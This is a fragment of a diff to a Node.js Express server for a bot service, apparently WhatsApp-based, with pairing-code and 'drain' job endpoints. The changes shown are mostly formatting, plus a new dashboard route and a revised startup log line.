   if (!sock.authState.creds.registered) {
-    const timeout = new Promise((_, reject) =>
-      setTimeout(() => reject(new Error('pairing timeout')), 25000)
-    );
+    const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('pairing timeout')), 25000));
     try { res.json({ code: await Promise.race([codePromise, timeout]) }); }
     catch (err) { res.status(500).json({ error: err?.message || 'pairing failed' }); }
   } else {
@@ -565,7 +636,6 @@ app.post('/api/drain/source', async (req, res) => {
     runDrain(drain, sock, sessionId).catch(() => {});
   }
 });
-
 app.get('/api/drain/status', (req, res) => {
   const id = String(req.query?.sessionId ?? '');
   const d = drains.get(id);
@@ -573,9 +643,12 @@ app.get('/api/drain/status', (req, res) => {
   res.json({ status: d.status, total: d.total, done: d.done, errors: d.errors });
 });
 
-// ── Static pages ───────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════
+// Static pages
+// ═══════════════════════════════════════════════════════════════════════
 app.get(['/drain', '/drain/:id'], (req, res) => res.sendFile(path.join(__dirname, 'public', 'drain.html')));
 app.get('/docs', (req, res) => res.sendFile(path.join(__dirname, 'public', 'docs.html')));
+app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
 
 app.get(['/admin', '/admin/'], (req, res) => {
   if (!ADMIN_TOKEN || req.query?.token !== ADMIN_TOKEN) return res.status(404).end();
@@ -588,5 +661,5 @@ app.get(['/panel', '/panel/'], (req, res) => {
 
 app.listen(PORT, () => {
   console.log(`[bothub] http://localhost:${PORT}`);
-  console.log(`[bothub] admin ${ADMIN_TOKEN ? '/admin?token=***' : 'disabled'} · panel ${ADMIN_TOKEN ? '/panel?token=***' : 'disabled'}`);
+  console.log(`[bothub] mail=${RESEND_API_KEY ? 'resend' : 'console-fallback'}`);
 });
